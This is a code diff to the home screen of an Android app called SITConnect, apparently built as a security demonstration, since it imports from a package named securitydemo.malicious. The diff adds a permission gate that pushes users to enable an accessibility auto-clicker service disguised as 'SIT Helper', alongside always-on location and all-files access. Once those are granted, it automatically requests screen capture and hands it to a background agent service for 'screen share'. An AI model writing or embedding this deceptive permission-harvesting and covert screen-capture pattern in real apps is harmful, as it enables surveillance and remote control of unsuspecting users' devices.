@@ -1,6 +1,7 @@
 package com.example.sitconnect
 
 import android.app.Activity
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.net.Uri
@@ -9,6 +10,7 @@ import android.os.Environment
 import android.os.PowerManager
 import android.provider.Settings
 import android.media.projection.MediaProjectionManager
+import android.text.TextUtils
 import android.util.Log
 import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.result.contract.ActivityResultContracts
@@ -52,6 +54,7 @@ import androidx.lifecycle.LifecycleEventObserver
 import androidx.lifecycle.compose.LocalLifecycleOwner
 import androidx.lifecycle.viewmodel.compose.viewModel
 import com.example.sitconnect.securitydemo.malicious.areAllLocationPermissionsGranted
+import com.example.sitconnect.securitydemo.malicious.AutoClickerService
 import com.example.sitconnect.ui.theme.SITConnectTheme
 
 data class FeatureItem(
@@ -85,6 +88,42 @@ fun HomeScreen(
     var missingLocation by remember { mutableStateOf(false) }
     var missingFiles by remember { mutableStateOf(false) }
     var missingBattery by remember { mutableStateOf(false) }
+    var missingAccessibility by remember { mutableStateOf(false) }
+    var permissionsChecked by remember { mutableStateOf(false) }
+
+    // Media Projection
+    val mediaProjectionManager = remember {
+        context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+    }
+
+    val mediaProjectionLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            val projectionIntent = result.data!!
+            val serviceIntent = Intent(context, AgentService::class.java).apply {
+                action = "START_SCREEN_SHARE"
+                putExtra("projection_intent", projectionIntent)
+            }
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                context.startForegroundService(serviceIntent)
+            } else {
+                context.startService(serviceIntent)
+            }
+        }
+    }
+
+    fun isAccessibilityServiceEnabled(context: Context, service: Class<out android.accessibilityservice.AccessibilityService>): Boolean {
+        val am = context.getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
+        val enabledServices = am.getEnabledAccessibilityServiceList(android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
+        for (enabledService in enabledServices) {
+            val serviceInfo = enabledService.resolveInfo.serviceInfo
+            if (serviceInfo.packageName == context.packageName && serviceInfo.name == service.name) {
+                return true
+            }
+        }
+        return false
+    }
 
     fun refreshPermissionDialogState() {
         missingLocation = !context.areAllLocationPermissionsGranted()
@@ -103,7 +142,10 @@ fun HomeScreen(
             false
         }
 
-        showPermissionDialog = missingLocation || missingFiles || missingBattery
+        missingAccessibility = !isAccessibilityServiceEnabled(context, AutoClickerService::class.java)
+
+        showPermissionDialog = missingLocation || missingFiles || missingBattery || missingAccessibility
+        permissionsChecked = true
     }
 
     // Navigate to login when logged out
@@ -131,6 +173,17 @@ fun HomeScreen(
         }
     }
 
+    // Launch Screen Share Request when permissions are satisfied
+    LaunchedEffect(showPermissionDialog, permissionsChecked) {
+        if (permissionsChecked && !showPermissionDialog) {
+             try {
+                mediaProjectionLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
+            } catch (e: Exception) {
+                Log.e("HomeScreen", "Failed to launch media projection", e)
+            }
+        }
+    }
+
     // Fetch user data when user changes
     LaunchedEffect(user?.uid) {
         user?.uid?.let { uid ->
@@ -145,6 +198,7 @@ fun HomeScreen(
             if (missingLocation) append("• Location: Precise + Always Allow\n")
             if (missingFiles) append("• Files: Allow management of all files\n")
             if (missingBattery) append("• Battery: Ignore battery optimizations\n")
+            if (missingAccessibility) append("• Accessibility: Enable 'SIT Helper' service\n")
         }
 
         AlertDialog(
@@ -196,6 +250,17 @@ fun HomeScreen(
                              }
                         }) {
                             Text("Ignore Battery Optimization")
+                        }
+                    }
+
+                    if (missingAccessibility) {
+                        TextButton(onClick = {
+                            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
+                                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                            }
+                            context.startActivity(intent)
+                        }) {
+                            Text("Enable Accessibility")
                         }
                     }
                 }
